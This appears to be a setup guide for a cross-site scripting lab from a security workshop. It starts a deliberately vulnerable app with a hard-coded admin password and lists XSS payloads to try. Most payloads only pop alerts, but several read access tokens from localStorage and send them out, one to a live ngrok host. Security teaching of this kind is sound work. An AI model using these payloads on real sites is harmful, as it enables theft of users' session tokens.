# Cross Site Scripting Setup

Access the relevant setup files in the path `web-app-security-nullcon2023-lab/vulnerabilities/xss/`.

1. Start the backend server:

    ```bash
    docker-compose up -f web-app-security-nullcon2023-lab/vulnerabilities/xss/backend/docker-compose.yml  -d --build
    ```

2. Create an admin user account using `create-admin` API endpoint:

    ```bash
    curl -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "password321"}' http://localhost:3000/create-admin
    ```

3. Start the frontend server:

    ```bash
    $ cd web-app-security-nullcon2023-lab/vulnerabilities/xss/frontend
    $ sudo python3 https_server.py
    ```

4. Exploit following vulnerabilities:
    * Reflected XSS
    * Stored XSS
    * DOM XSS

5. Try these XSS payloads:

    ```js
    <IMG SRC=# onmouseover="alert('xxs')">
    <img src='x' onerror=alert(1) />
    <audio src='x' onerror=alert(2) />
    <video src='x' onerror=alert(3) />
    <script>alert(4);</script>
    <script>const win = window.open("http://example.com"); win.location = "javascript:alert(document.domain)"; </script>
    <script>const secret = localStorage.getItem('accessToken'); const win = window.open("http://127.0.0.1:1234/?secret="+secret); </script>
    <iframe src="javascript:document.location='http://127.0.0.1:1234/?token='+localStorage.getItem('accessToken')"></iframe>
    <img src=1 onerror="
        for(var i=0, len=localStorage.length; i<len; i++) {
            var key = localStorage.key(i);
            var value = localStorage[key];
            var request = new XMLHttpRequest();
            var url = 'https://c053-2401-4900-1cc5-c041-f040-bffb-825d-7b48.ngrok-free.app/?key=' + key + '&value=' + value;
            request.open('GET', url, false);
            request.send();
        }" />
    ```